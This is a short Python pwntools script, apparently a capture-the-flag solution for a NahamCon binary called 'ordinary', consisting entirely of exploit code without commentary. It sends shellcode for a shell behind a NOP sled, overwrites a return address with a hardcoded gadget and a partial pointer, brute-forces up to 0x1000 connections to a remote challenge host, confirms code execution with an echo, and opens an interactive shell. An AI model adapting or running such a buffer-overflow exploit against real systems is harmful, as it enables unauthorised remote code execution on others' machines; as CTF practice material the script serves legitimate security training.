from pwn import *
from time import sleep

e = ELF("./ordinary")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)


for i in range(0x1000):
  if is_remote:
    p = remote("challenge.nahamcon.com", 31264)
  else:
    p = process(e.path)
    #, env={"LD_PRELOAD": libc.path})

  try:
    p.sendafter("get.", (asm(shellcraft.sh()) + "A" * 0x40).rjust(0x1fc, asm("nop")) + p64(0x00401021) * 2 + "\xac\xc2")

    p.recvuntil(asm("nop") * 8)

    p.sendline("echo BBB")

    p.recvuntil("BBB")
  except Exception:
    continue

  p.interactive()
